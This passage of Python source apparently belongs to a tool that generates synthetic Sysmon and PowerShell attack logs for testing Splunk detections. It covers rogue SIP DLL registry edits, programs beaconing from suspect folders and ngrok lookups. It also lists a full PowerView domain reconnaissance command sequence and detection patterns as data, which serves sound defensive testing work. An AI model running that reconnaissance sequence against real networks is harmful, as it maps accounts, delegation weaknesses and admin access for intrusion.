        values = (environment or {}).get('values') or {}
        identity = options.get('attack_identity')
        identity = identity if isinstance(identity, dict) else {}

        def choice(field):
            value = identity.get(field)
            return value if isinstance(value, dict) else {}

        dest = _single_value(choice('dest'), 'dest', values,
                             lambda r: r.choice(WINDOWS_WORKSTATIONS), rng)
        user = _single_value(choice('user'), 'user', values,
                             lambda r: r.choice(WINDOWS_ATTACK_USERS), rng)

        def guid():
            return ('{%08X-%04X-%04X-%04X-%012X}' % (
                rng.randint(0, 0xFFFFFFFF), rng.randint(0, 0xFFFF), rng.randint(0, 0xFFFF),
                rng.randint(0, 0xFFFF), rng.randint(0, 0xFFFFFFFFFFFF)))

        def event(**extra):
            return {'dest': dest, 'user': user,
                    'image': rng.choice(SIP_WRITERS), 'event_id': 13,
                    'event_type': 'SetValue', **extra}

        attack_identities = [
            event(target_object=(rng.choice(SIP_KEYS).format(guid=guid())
                                 + '\\' + rng.choice(SIP_VALUE_NAMES)),
                  details=rng.choice(SIP_ROGUE_DLLS))
            for _ in range(attacks)
        ]

        noise_identities = []
        for _ in range(noise):
            draw = rng.random()
            if draw < 0.45:
                # A SIP key, but a value the search does not read.
                noise_identities.append(event(
                    target_object=(rng.choice(SIP_KEYS).format(guid=guid())
                                   + '\\' + rng.choice(SIP_OTHER_VALUES)),
                    details=rng.choice(SIP_REAL_DLLS)))
            elif draw < 0.8:
                # A Dll value, somewhere that is not a SIP key.
                noise_identities.append(event(
                    target_object=rng.choice(NON_SIP_KEYS),
                    details=f'DWORD (0x{rng.randint(0, 4):08x})'))
            else:
                noise_identities.append(event(ordinary=True))
        return attack_identities, noise_identities

    def _build(self, event):
        return self._sysmon.registry_event(
            event['event_id'], target_object=event['target_object'],
            image=event['image'], details=event['details'],
            event_type=event['event_type'], dest=event['dest'], user=event['user'])

    def _standalone(self):
        return {'dest': random.choice(WINDOWS_WORKSTATIONS),
                'user': random.choice(WINDOWS_ATTACK_USERS),
                'image': SIP_WRITERS[0], 'event_id': 13, 'event_type': 'SetValue',
                'target_object': SIP_KEYS[0].format(
                    guid='{603BCC1F-4B59-4E08-B724-D2C6297EF351}') + '\\Dll',
                'details': SIP_ROGUE_DLLS[0]}


#: The nine locations the detection treats as suspect for a program that opens
#: a socket. None of them is where software is supposed to live.
SUSPECT_PROGRAM_PATHS = [
    'C:\\$Recycle.Bin\\S-1-5-21-1004336348-1177238915-682003330-1001\\{name}.exe',
    'C:\\Windows\\System32\\Config\\SystemProfile\\AppData\\Local\\{name}.exe',
    'C:\\PerfLogs\\{name}.exe',
    'C:\\Users\\All Users\\{name}.exe',
    'C:\\Users\\Default\\AppData\\Roaming\\{name}.exe',
    'C:\\Users\\Public\\{name}.exe',
    'C:\\Windows\\addins\\{name}.exe',
    'C:\\Windows\\Fonts\\{name}.exe',
    'C:\\Windows\\IME\\{name}.exe',
]
SUSPECT_PROGRAM_NAMES = ['svchost', 'updater', 'winhost', 'audiodg', 'taskmgr', 'runtime']
#: Where a program that opens a socket normally lives.
ORDINARY_PROGRAMS = [
    'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
    'C:\\Windows\\System32\\svchost.exe',
    'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE',
    'C:\\Windows\\System32\\lsass.exe',
]
#: Where a beacon goes, and on what.
BEACON_PEERS = [
    ('45.83.220.14', 'cdn-eu-3.example.net', '443', 'tcp'),
    ('185.199.108.153', 'raw.contents.example', '443', 'tcp'),
    ('91.219.236.10', '-', '8443', 'tcp'),
    ('194.26.29.84', 'sync.updates.example', '80', 'tcp'),
]


class SysmonSuspectLocationConnectionGenerator(SysmonAttackGenerator):
    """A program in a place software does not live, opening a socket (T1011).

        FROM datamodel=Network_Traffic.All_Traffic
        WHERE All_Traffic.app IN ("*\\$Recycle.Bin\\*", "*\\PerfLogs\\*",
                                  "*\\Users\\Public\\*", "*\\Windows\\Fonts\\*", …)

    `app` is the only clause, and on an EventID 3 the add-on builds it straight
    from Image — so what decides the match is where the program lives, not what
    it talks to.

    Two of the fields it groups by are worth knowing about. `src` is not the
    source address: EVAL-src falls through to SourceHostname before SourceIp,
    so it is the workstation's name. And `protocol_version` is derived, not
    reported — "ipv4" unless DestinationIsIpv6 says otherwise.
    """

    @classmethod
    def plan_identities(cls, definition, options, attacks, noise, environment, rng=random):
        """(attack identities, noise identities), each event decided once.

        One clause means one kind of near miss: the same connections made by a
        program living where it should. The sender's ordinary traffic fills the
        rest.
        """
        values = (environment or {}).get('values') or {}
        identity = options.get('attack_identity')
        identity = identity if isinstance(identity, dict) else {}

        def choice(field):
            value = identity.get(field)
            return value if isinstance(value, dict) else {}

        dest = _single_value(choice('dest'), 'dest', values,
                             lambda r: r.choice(WINDOWS_WORKSTATIONS), rng)
        user = _single_value(choice('user'), 'user', values,
                             lambda r: r.choice(WINDOWS_ATTACK_USERS), rng)

        def peer():
            ip, _name, port, _transport = rng.choice(BEACON_PEERS)
            return {'dest_ip': ip, 'dest_port': port}

        def event(**extra):
            return {'dest': dest, 'user': user, **extra}

        attack_identities = [
            event(image=rng.choice(SUSPECT_PROGRAM_PATHS).format(
                      name=rng.choice(SUSPECT_PROGRAM_NAMES)), **peer())
            for _ in range(attacks)
        ]

        noise_identities = []
        for _ in range(noise):
            if rng.random() < 0.6:
                noise_identities.append(event(image=rng.choice(ORDINARY_PROGRAMS), **peer()))
            else:
                noise_identities.append(event(ordinary=True))
        return attack_identities, noise_identities

    def _build(self, event):
        return self._sysmon.network_event(
            image=event['image'], dest_ip=event['dest_ip'], dest_port=event['dest_port'],
            dest=event['dest'], user=event['user'])

    def _standalone(self):
        return {'dest': random.choice(WINDOWS_WORKSTATIONS),
                'user': random.choice(WINDOWS_ATTACK_USERS),
                'image': 'C:\\Users\\Public\\svchost.exe',
                'dest_ip': BEACON_PEERS[0][0], 'dest_port': BEACON_PEERS[0][2]}


SYSMON_FILE_ATTACK_TYPES = {
    'sysmon_temp_path_executable': {
        'name': 'Executables Or Script Creation In Temp Path',
        'description': 'An executable or script written into a temp directory — how a dropper stages its payload (T1036)',
        'log_type': 'sysmon',
        'category': 'Endpoint',
        'datamodel': 'Endpoint',
        'splunk_research_url': 'https://research.splunk.com/endpoint/e0422b71-2c05-4f32-8754-01fb415f49c9/',
        'data_sources': [
            {'log_type': 'sysmon',
             'sourcetype': 'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
             'label': 'Sysmon · file creation (EventID 11)',
             'formats': ['xml']},
        ],
        'detection': {
            'name': 'Executables Or Script Creation In Temp Path',
            'id': 'e0422b71-2c05-4f32-8754-01fb415f49c9',
            'datamodel': 'Endpoint.Filesystem',
            'where': 'Filesystem.action = "created" Filesystem.file_name IN ("*.exe","*.ps1",…) Filesystem.file_path IN ("*:\\\\Temp\\\\*","*\\\\AppData\\\\Local\\\\Temp\\\\*",…)',
            'by': ['action', 'dest', 'file_access_time', 'file_create_time', 'file_hash', 'file_modify_time', 'file_name', 'file_path', 'file_acl', 'file_size', 'process_guid', 'process_id', 'user', 'vendor_product'],
            'entities': ['dest', 'user'],
        },
        'defaults': {'events': 1, 'noise_events': 20, 'duration': 30},
        'count_label': 'Number of Events',
        'count_hint': 'Each event triggers the detection on its own — no threshold to reach.',
        'identity_fields': [
            {'field': 'dest', 'mode': 'asset', 'label': 'Endpoint',
             'picker': 'assets', 'picker_value': 'nt_host', 'kind': 'hostname',
             'hint': 'The machine the event came from (Computer).'},
            {'field': 'user', 'mode': 'asset', 'label': 'User',
             'picker': 'identities', 'picker_value': 'username', 'kind': 'username',
             'hint': 'The account the process ran as (User).'},
        ],
        'ai_fields': {
            'dest': {'type': 'entity', 'entity_type': 'endpoint', 'entity_field': 'nt_host',
                     'description': 'Endpoint the activity happened on'},
            'user': {'type': 'either', 'options': [
                        {'type': 'account', 'account_type': 'standard', 'account_field': 'username'},
                        {'type': 'account', 'account_type': 'admin', 'account_field': 'username'},
                     ],
                     'description': 'Account the process ran as'},
        },
        'field_behaviors': {},
        'sample_logs': ["<Event…><EventID>11</EventID>…<Data Name='TargetFilename'>C:\\Windows\\Temp\\svc417.exe</Data>…</Event>"],
    },
}


SYSMON_DNS_ATTACK_TYPES = {
    'sysmon_ngrok_dns': {
        'name': 'Ngrok Reverse Proxy on Network',
        'description': 'A host resolving an ngrok tunnel — a reverse proxy out of the network (T1572, T1090)',
        'log_type': 'sysmon',
        'category': 'Endpoint',
        'datamodel': 'Network_Resolution',
        'splunk_research_url': 'https://research.splunk.com/network/5790a766-53b8-40d3-a696-3547b978fcf0/',
        'data_sources': [
            {'log_type': 'sysmon',
             'sourcetype': 'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
             'label': 'Sysmon · DNS query (EventID 22)',
             'formats': ['xml']},
        ],
        'detection': {
            'name': 'Ngrok Reverse Proxy on Network',
            'id': '5790a766-53b8-40d3-a696-3547b978fcf0',
            'datamodel': 'Network_Resolution',
            'where': 'DNS.query IN ("*.ngrok.com","*.ngrok.io","ngrok.*.tunnel.com","korgn.*.lennut.com")',
            'by': ['answer', 'answer_count', 'query', 'query_count', 'reply_code_id', 'src', 'vendor_product'],
            'entities': ['dest', 'user'],
        },
        'defaults': {'events': 1, 'noise_events': 20, 'duration': 30},
        'count_label': 'Number of Events',
        'count_hint': 'Each event triggers the detection on its own — no threshold to reach.',
        'identity_fields': [
            {'field': 'dest', 'mode': 'asset', 'label': 'Endpoint',
             'picker': 'assets', 'picker_value': 'nt_host', 'kind': 'hostname',
             'hint': 'The machine the event came from (Computer).'},
            {'field': 'user', 'mode': 'asset', 'label': 'User',
             'picker': 'identities', 'picker_value': 'username', 'kind': 'username',
             'hint': 'The account the process ran as (User).'},
        ],
        'ai_fields': {
            'dest': {'type': 'entity', 'entity_type': 'endpoint', 'entity_field': 'nt_host',
                     'description': 'Endpoint the activity happened on'},
            'user': {'type': 'either', 'options': [
                        {'type': 'account', 'account_type': 'standard', 'account_field': 'username'},
                        {'type': 'account', 'account_type': 'admin', 'account_field': 'username'},
                     ],
                     'description': 'Account the process ran as'},
        },
        'field_behaviors': {},
        'sample_logs': ["<Event…><EventID>22</EventID>…<Data Name='QueryName'>4f2a91bc.ngrok.io</Data>…</Event>"],
    },
}


SYSMON_SIP_ATTACK_TYPES = {
    'sysmon_sip_provider_registry': {
        'name': 'Windows Registry SIP Provider Modification',
        'description': 'A subject interface package pointed at another DLL, so Windows asks it whether a file is signed (T1553.003)',
        'log_type': 'sysmon',
        'category': 'Endpoint',
        'datamodel': 'Endpoint',
        'splunk_research_url': 'https://research.splunk.com/endpoint/3b4e18cb-497f-4073-85ad-1ada7c2107ab/',
        'data_sources': [
            {'log_type': 'sysmon',
             'sourcetype': 'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
             'label': 'Sysmon · registry value set (EventID 13)',
             'formats': ['xml']},
        ],
        'detection': {
            'name': 'Windows Registry SIP Provider Modification',
            'id': '3b4e18cb-497f-4073-85ad-1ada7c2107ab',
            'datamodel': 'Endpoint.Registry',
            'where': 'Registry.registry_path IN ("*\\\\SOFTWARE\\\\Microsoft\\\\Cryptography\\\\Providers\\\\*","*\\\\SOFTWARE\\\\Microsoft\\\\Cryptography\\\\OID\\\\EncodingType*",…) Registry.registry_value_name IN ("Dll","$DLL")',
            'by': ['action', 'dest', 'process_guid', 'process_id', 'registry_hive', 'registry_path', 'registry_key_name', 'registry_value_data', 'registry_value_name', 'registry_value_type', 'status', 'user', 'vendor_product'],
            'entities': ['dest', 'user'],
        },
        'defaults': {'events': 1, 'noise_events': 20, 'duration': 30},
        'count_label': 'Number of Events',
        'count_hint': 'Each event triggers the detection on its own — no threshold to reach.',
        'identity_fields': [
            {'field': 'dest', 'mode': 'asset', 'label': 'Endpoint',
             'picker': 'assets', 'picker_value': 'nt_host', 'kind': 'hostname',
             'hint': 'The machine the event came from (Computer).'},
            {'field': 'user', 'mode': 'asset', 'label': 'User',
             'picker': 'identities', 'picker_value': 'username', 'kind': 'username',
             'hint': 'The account the process ran as (User).'},
        ],
        'ai_fields': {
            'dest': {'type': 'entity', 'entity_type': 'endpoint', 'entity_field': 'nt_host',
                     'description': 'Endpoint the activity happened on'},
            'user': {'type': 'either', 'options': [
                        {'type': 'account', 'account_type': 'standard', 'account_field': 'username'},
                        {'type': 'account', 'account_type': 'admin', 'account_field': 'username'},
                     ],
                     'description': 'Account the process ran as'},
        },
        'field_behaviors': {},
        'sample_logs': ["<Event…><EventID>13</EventID>…<Data Name='TargetObject'>HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Providers\\{…}\\Dll</Data>…</Event>"],
    },
}


SYSMON_NETWORK_ATTACK_TYPES = {
    'sysmon_connection_from_suspect_path': {
        'name': 'Windows Network Connection From Program In Suspect Location',
        'description': 'A program living where software does not, opening a socket (T1011)',
        'log_type': 'sysmon',
        'category': 'Endpoint',
        'datamodel': 'Network_Traffic',
        'splunk_research_url': 'https://research.splunk.com/endpoint/90fd571b-78d4-409e-a2de-0f0a80c75a84/',
        'data_sources': [
            {'log_type': 'sysmon',
             'sourcetype': 'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
             'label': 'Sysmon · network connection (EventID 3)',
             'formats': ['xml']},
        ],
        'detection': {
            'name': 'Windows Network Connection From Program In Suspect Location',
            'id': '90fd571b-78d4-409e-a2de-0f0a80c75a84',
            'datamodel': 'Network_Traffic.All_Traffic',
            'where': 'All_Traffic.app IN ("*\\\\$Recycle.Bin\\\\*","*\\\\PerfLogs\\\\*","*\\\\Users\\\\Public\\\\*",…)',
            'by': ['dest', 'dest_ip', 'dest_port', 'src', 'src_ip', 'src_port', 'transport', 'protocol', 'protocol_version', 'direction', 'action', 'app', 'dvc', 'user', 'vendor_product'],
            'entities': ['dest', 'user'],
        },
        'defaults': {'events': 1, 'noise_events': 20, 'duration': 30},
        'count_label': 'Number of Events',
        'count_hint': 'Each event triggers the detection on its own — no threshold to reach.',
        'identity_fields': [
            {'field': 'dest', 'mode': 'asset', 'label': 'Endpoint',
             'picker': 'assets', 'picker_value': 'nt_host', 'kind': 'hostname',
             'hint': 'The machine the event came from (Computer).'},
            {'field': 'user', 'mode': 'asset', 'label': 'User',
             'picker': 'identities', 'picker_value': 'username', 'kind': 'username',
             'hint': 'The account the process ran as (User).'},
        ],
        'ai_fields': {
            'dest': {'type': 'entity', 'entity_type': 'endpoint', 'entity_field': 'nt_host',
                     'description': 'Endpoint the activity happened on'},
            'user': {'type': 'either', 'options': [
                        {'type': 'account', 'account_type': 'standard', 'account_field': 'username'},
                        {'type': 'account', 'account_type': 'admin', 'account_field': 'username'},
                     ],
                     'description': 'Account the process ran as'},
        },
        'field_behaviors': {},
        'sample_logs': ["<Event…><EventID>3</EventID>…<Data Name='Image'>C:\\Users\\Public\\svchost.exe</Data>…</Event>"],
    },
}


#: PowerView's reconnaissance sequence, in the order an operator walks it:
#: who is in the domain, which machines, how it is joined to others, then the
#: paths worth taking. Each line is one script block, exactly as the engine logs
#: an interactive call — short, with no Path, the shape Splunk's own datasets
#: for these detections carry (`get-domaingroup`, `Get-NetComputer -Unconstrained`).
#:
#: Seventeen published detections read these, which is the point of the attack:
#: no other single source here lights up so many rules from one run. The
#: comments name what each line is for, not which rule it trips — the rules are
#: checked in tests/test_attack_powerview.py against their own filters.
POWERVIEW_RECON = [
    # Loading the module is itself logged, and names the tool.
    "Import-Module .\\PowerView.ps1",
    # Who.
    "Get-DomainUser -Identity * -Properties samaccountname,memberof,lastlogon",
    "Get-DomainGroup -Identity 'Domain Admins' | Select-Object member",
    # What.
    "Get-DomainComputer -Properties dnshostname,operatingsystem",
    "Get-DomainController -Domain corp.local",
    "Get-DomainOU -Properties name,distinguishedname",
    # How it is joined to the rest.
    "Get-DomainTrust",
    "Get-ForestDomain",
    "Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess",
    # Where the weaknesses are.
    "Get-DomainComputer -Unconstrained -Properties dnshostname",
    "Get-DomainComputer -TrustedToAuth -Properties msds-allowedtodelegateto",
    "Get-DomainUser -SPN -Properties serviceprincipalname",
    "Get-DomainSPNTicket -SPN MSSQLSvc/sql01.corp.local:1433",
    "Find-InterestingDomainAcl -ResolveGUIDs",
    "Find-LocalAdminAccess -Domain corp.local",
    "Invoke-ShareFinder -CheckShareAccess -ExcludeStandard",
]

#: The near miss: a domain administrator asking the same questions with
#: Microsoft's own ActiveDirectory module, from the same host and the same
#: account. `Get-ADTrust` beside PowerView's `Get-DomainTrust`, and
#: `Get-ADOrganizationalUnit` beside `Get-DomainOU`, are the same query with the
#: supported tool.
#:
#: Which of them is safe to send was measured, not assumed: the AD module is
#: itself widely covered, and `Get-ADUser`, `Get-ADComputer` and `Get-ADGroup`
#: each have a published rule of their own. `Get-ADDomainController` is the
#: subtle one — it contains the string `get-addomain`, which PowerShell Domain
#: Enumeration watches for. Everything below was checked against all 121
#: detections and trips none; tests/test_attack_powerview.py re-checks it.
POWERVIEW_NOISE = [
    "Get-ADOrganizationalUnit -Filter * | Select-Object Name,DistinguishedName",
    "Get-ADTrust -Filter * | Select-Object Name,Direction",
    "Get-ADReplicationSite -Filter * | Select-Object Name",
    "Get-ADPrincipalGroupMembership -Identity jsmith | Select-Object Name",
    "Get-ADObject -LDAPFilter '(objectClass=site)' -SearchBase 'CN=Configuration,DC=corp,DC=local'",
    "Search-ADAccount -AccountInactive -TimeSpan 90.00:00:00 -UsersOnly",
    "Get-ADReplicationPartnerMetadata -Target dc01.corp.local",
    "Get-ADServiceAccount -Filter * | Select-Object Name,Enabled",
    "Get-ADOptionalFeature -Filter * | Select-Object Name,EnabledScopes",
    "Get-ADRootDSE | Select-Object dnsHostName,forestFunctionality",
    "Test-ComputerSecureChannel -Server dc01.corp.local",
    "Sync-ADObject -Object 'CN=jsmith,OU=Staff,DC=corp,DC=local' -Source dc01 -Destination dc02",
]


class PowerShellAttackGenerator(BaseAttackGenerator):
    """Base for attacks that show up as PowerShell script blocks (EventID 4104).

    The same arrangement as SysmonAttackGenerator: every event renders through
    the source's own generator, so one place decides what a 4104 looks like and
    the benign noise is literally what the sender already emits. A subclass
    supplies `plan_identities` and `_build`.
    """

    FIELD_DEFAULTS = {}

    def __init__(self, field_behaviors, options=None):
        super().__init__(field_behaviors, options)
        self._powershell = PowerShellLogGenerator()

    def generate(self) -> str:
        self.event_count += 1
        return self._render(self._identity)

    def generate_noise(self) -> str:
        return self._render(self._identity)

    def _render(self, event):
        event = event or self._standalone()
        if event.get('ordinary'):
            return self._powershell.generate()
        return self._powershell.render(self._build(event))

    def _build(self, event):
        raise NotImplementedError


class PowerShellPowerViewGenerator(PowerShellAttackGenerator):
    """A PowerView sweep of Active Directory, seen through script block logging.

    PowerView is one PowerShell module, so one operator session is one attack —
    not a bundle of unrelated things. Running it walks the domain: accounts,
    groups, machines, trusts, then the delegation and ACL weaknesses worth
    taking. Seventeen published detections read those cmdlet names out of
    ScriptBlockText, and a full run trips all of them.

    Two things about the shape are taken from Splunk's own datasets rather than
    invented. The events are the *invocations* — short, Path empty — because
    that is what `T1059.001/powershell_script_block_logging/domaingroup.log` and
    the constrained-delegation dataset contain. What those datasets also contain
    is the other half of the signal: importing PowerView.ps1 compiles the module
    itself, which the engine logs as ~41 events of ~19 KB sharing one
    ScriptBlockId, each carrying the file in Path. That half is not reproduced
    here — it is multi-line and far past the size at which the engine splits a
    block, and this app sends one event per line.

    The cmdlets are spelled the PowerView 3.0 way (`Get-Domain*`). PowerView 2.0
    named several of them `Get-Net*`, and the delegation and SPN rules accept
    either through an OR; the narrower rules name only the 3.0 spelling, so a
    3.0 run is the one that reaches all seventeen.
    """

    @classmethod
    def plan_identities(cls, definition, options, attacks, noise, environment, rng=random):
        """(attack identities, noise identities), each event decided once.

        One endpoint and one account for the whole session, because it is one
        operator at one console. The recon lines are dealt in order and wrap
        around, so a short run still covers the start of the sequence and a run
        the length of the sequence covers all of it.

        The noise is the same administration done with Microsoft's
        ActiveDirectory module — same host, same account, nothing a rule reads.
        """
        values = (environment or {}).get('values') or {}
        identity = options.get('attack_identity')
        identity = identity if isinstance(identity, dict) else {}

        def choice(field):
            value = identity.get(field)
            return value if isinstance(value, dict) else {}

        dest = _single_value(choice('dest'), 'dest', values,
                             lambda r: r.choice(WINDOWS_WORKSTATIONS), rng)
        user = _single_value(choice('user'), 'user', values,
                             lambda r: r.choice(WINDOWS_ATTACK_USERS), rng)

        attack_identities = [
            {'dest': dest, 'user': user,
             'script_block_text': POWERVIEW_RECON[i % len(POWERVIEW_RECON)]}
            for i in range(attacks)
        ]
        noise_identities = [
            {'dest': dest, 'user': user,
             'script_block_text': rng.choice(POWERVIEW_NOISE)}
            for _ in range(noise)
        ]
        return attack_identities, noise_identities

    def _build(self, event):
        # Path stays empty: these are typed at a console, not compiled from a
        # file, which is what the published datasets show.
        return self._powershell.script_block_event(
            script_block_text=event['script_block_text'], path='',
            dest=event['dest'], user=event['user'])

    def _standalone(self):
        """An event rendered outside a plan — a preview, or a format test."""
        return {'dest': random.choice(WINDOWS_WORKSTATIONS),
                'user': random.choice(WINDOWS_ATTACK_USERS),
                'script_block_text': POWERVIEW_RECON[1]}


POWERSHELL_POWERVIEW_ATTACK_TYPES = {
    'powershell_powerview_domain_recon': {
        'name': 'PowerView Domain Reconnaissance',
        'description': 'A PowerView sweep of Active Directory through PowerShell '
                       'script block logging — accounts, groups, machines, trusts, '
                       'then delegation and ACL weaknesses. One run trips 17 '
                       'published detections (T1087.002, T1018, T1069.002, T1482)',
        'log_type': 'powershell',
        'category': 'Endpoint',
        # This channel reaches no CIM datamodel: the two eventtypes it matches
        # carry one tag between them and it is not a CIM tag. Every one of the
        # detections is a raw search, so there is no datamodel to claim.
        'datamodel': '',
        'splunk_research_url': 'https://research.splunk.com/endpoint/e1866ce2-ca22-11eb-8e44-acde48001122/',
        'data_sources': [
            {'log_type': 'powershell',
             'sourcetype': 'XmlWinEventLog:Microsoft-Windows-PowerShell/Operational',
             'label': 'PowerShell · script block logging (EventID 4104)',
             'formats': ['xml']},
        ],
        # splunk/security_content detections/endpoint/powershell_domain_enumeration.yml
        # is the anchor — one published rule whose IN-list covers the family.
        # The other sixteen a full run trips are listed in
        # tests/test_attack_powerview.py, checked against their own filters.
        'detection': {
            'name': 'PowerShell Domain Enumeration',
            'id': 'e1866ce2-ca22-11eb-8e44-acde48001122',
            'datamodel': None,
            'where': 'EventCode=4104 ScriptBlockText IN (*get-netdomaintrust*, '
                     '*get-netforesttrust*, *get-addomain*, *get-adgroupmember*, '
                     '*get-domainuser*)',
            'by': ['dest', 'signature', 'signature_id', 'user_id', 'vendor_product',
                   'EventID', 'Guid', 'Opcode', 'Name', 'Path', 'ProcessID',
                   'ScriptBlockId', 'ScriptBlockText'],
            'entities': ['dest', 'user'],
        },
        'defaults': {'events': 16, 'noise_events': 20, 'duration': 60},
        'count_label': 'Number of Cmdlets Run',
        'count_hint': 'Each cmdlet fires its own rule, so there is no threshold to '
                      'reach — but the 16 in the sequence are what trips all 17 '
                      'detections. Fewer covers the start of the sweep.',
        'identity_fields': [
            {'field': 'dest', 'mode': 'asset', 'label': 'Endpoint',
             'picker': 'assets', 'picker_value': 'nt_host', 'kind': 'hostname',
             'hint': 'The machine PowerView was run from (Computer).'},
            {'field': 'user', 'mode': 'asset', 'label': 'User',
             'picker': 'identities', 'picker_value': 'username', 'kind': 'username',
             'hint': 'The account it ran as. This channel carries no user name, '
                     'only a SID, so the account is represented as a stable SID '
                     'derived from it.'},
        ],
        'ai_fields': {
            'dest': {'type': 'entity', 'entity_type': 'endpoint', 'entity_field': 'nt_host',
                     'description': 'Endpoint PowerView was run from'},
            'user': {'type': 'either', 'options': [
                        {'type': 'account', 'account_type': 'standard', 'account_field': 'username'},
                        {'type': 'account', 'account_type': 'admin', 'account_field': 'username'},
                     ],
                     'description': 'Account it ran as, carried as a derived SID'},
        },
        'field_behaviors': {},
        'sample_logs': [
            "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2026-02-18T10:30:01.000000000Z'/><EventRecordID>173536</EventRecordID><Correlation ActivityID='{3282F326-6ACF-0002-0F16-8432CF6ADA01}'/><Execution ProcessID='4744' ThreadID='3940'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WKS-FIN01</Computer><Security UserID='S-1-5-21-3344543075-1022232225-2459664213-1105'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Get-DomainUser -Identity * -Properties samaccountname,memberof,lastlogon</Data><Data Name='ScriptBlockId'>dad71a18-1edf-4d03-afb0-a69983c05ad5</Data><Data Name='Path'></Data></EventData></Event>",
        ],
    },
}


def _register(attack_types_dict: dict, generator_class) -> None:
    """Register a group of attack-type definitions with their generator class."""
    for key, defn in attack_types_dict.items():
        ATTACK_REGISTRY[key] = {**defn, 'generator_class': generator_class}


_register(SSH_ATTACK_TYPES,      SSHBruteForceGenerator)
_register({k: v for k, v in NETWORK_ATTACK_TYPES.items() if 'horizontal' in k},
          HorizontalPortScanGenerator)
_register({k: v for k, v in NETWORK_ATTACK_TYPES.items() if 'vertical' in k},
          VerticalPortScanGenerator)
_register(WINDOWS_ATTACK_TYPES,  WindowsTorClientGenerator)
_register(WINDOWS_AD_ATTACK_TYPES, WindowsSidHistoryGenerator)
_register(CISCO_ATTACK_TYPES,    CiscoTrafficMirroringGenerator)
_register(WINDOWS_SYSWOW64_ATTACK_TYPES, WindowsSysWow64Generator)
_register(SYSMON_ATTACK_TYPES,   SysmonFirewallRuleGenerator)
_register(SYSMON_PROCESS_ATTACK_TYPES, SysmonRenamedPowershellGenerator)
_register(SYSMON_FILE_ATTACK_TYPES,    SysmonTempPathDropGenerator)
_register(SYSMON_DNS_ATTACK_TYPES,     SysmonNgrokDnsGenerator)
_register(SYSMON_SIP_ATTACK_TYPES,     SysmonSipProviderGenerator)
_register(SYSMON_NETWORK_ATTACK_TYPES, SysmonSuspectLocationConnectionGenerator)
_register(POWERSHELL_POWERVIEW_ATTACK_TYPES, PowerShellPowerViewGenerator)

# Backward-compat alias used by log_senders.py
ALL_ATTACK_TYPES = ATTACK_REGISTRY


DESTINATION_TYPES = ('file', 'configuration', 'syslog')


def attack_destinations(defn):
    """The destination types an attack can be sent to.

    An attack over several sourcetypes is not sent over syslog: a syslog
    destination is one stream, which SC4S would classify as a single source —
    every event of the attack under the first sourcetype's rules. HEC stamps
    each event's sourcetype, and a file simply receives the events as HEC sends
    them (see `spans_several_sources`). Attacks with one data source keep every
    destination.
    """
    open_types = [d for d in DESTINATION_TYPES
                  if d != 'syslog' or _any_source_is_syslog_viable(defn)]
    if spans_several_sources(defn):
        return [d for d in open_types if d != 'syslog']
    return open_types


def attack_destinations_note(defn):
    """Why an attack's destinations are restricted, in one sentence, or None."""
    open_types = attack_destinations(defn)
    if len(open_types) == len(DESTINATION_TYPES):
        return None
    where = ' or '.join({'file': 'a Local File', 'configuration': 'HEC',
                         'syslog': 'syslog'}[d] for d in open_types)
    if spans_several_sources(defn):
        reason = 'This attack spans several sourcetypes'
    else:
        source = (defn.get('data_sources') or [{}])[0]
        from ta_registry import get_ta
        technology = (get_ta(source.get('log_type')) or {}).get('display_name', 'This source')
        reason = f'{technology} is not collected over syslog'
    note = f'{reason}, so it is sent to {where} only.'
    if 'file' in open_types:
        note += ' A file receives the events exactly as HEC sends them.'
    return note


def _any_source_is_syslog_viable(defn):
    """True while at least one declared source is a technology syslog collects.

    Windows events are read from the event log by a forwarder or shipped over
    HEC; nothing sends them to a syslog port, and ta_registry says so with
    `syslog_viable: False`. Offering the destination would only produce a stream
    no add-on claims.
    """
    from ta_registry import get_ta
    sources = defn.get('data_sources') or []
    if not sources:
        return True
    return any((get_ta(s['log_type']) or {}).get('syslog_viable') is not False
               for s in sources)


def spans_several_sources(defn):
    """True for an attack declaring more than one data source.

    Such an attack is delivered in one shape only, the HEC one — on a file too,
    so no per-source delivery format applies.
    """
    return len(defn.get('data_sources') or []) > 1


class AttackGeneratorFactory:
    """Thin registry-based factory — no if/elif chains needed."""

    @staticmethod
    def get_generator(attack_type: str, options: dict = None):
        """Return an instantiated generator for attack_type, or None."""
        defn = ATTACK_REGISTRY.get(attack_type)
        if not defn:
            return None
        return defn['generator_class'](defn['field_behaviors'], options or {})

    @staticmethod
    def get_available_attack_types() -> dict:
        """Return metadata for all registered attack types (used by API)."""
        result = {}
        for key, defn in ATTACK_REGISTRY.items():
            overridable_fields = {
                field: {'label': field.replace('_', ' ').title(), 'behavior': behavior}
                for field, behavior in defn['field_behaviors'].items()
            }
            result[key] = {
                'name':                defn['name'],
                'description':         defn['description'],
                'log_type':            defn['log_type'],
                'category':            defn.get('category', defn['log_type'].upper()),
                'datamodel':           defn.get('datamodel'),
                'splunk_research_url': defn.get('splunk_research_url'),
                'ai_fields':           defn.get('ai_fields', {}),
                'field_behaviors':     defn['field_behaviors'],
                'overridable_fields':  overridable_fields,
                'sample_logs':         defn.get('sample_logs', []),
                # Present only on attacks migrated to declared data sources; the
                # form shows the new configuration for those alone.
                'data_sources':        AttackGeneratorFactory._data_sources(defn),
                'detection':           defn.get('detection'),
                'defaults':            defn.get('defaults', {}),
                'noise':               hasattr(defn['generator_class'], 'generate_noise'),
                'destinations':        attack_destinations(defn),
                'destinations_note':   attack_destinations_note(defn),
                'warning':             defn.get('warning'),
                'count_label':         defn.get('count_label'),
                'count_hint':          defn.get('count_hint'),
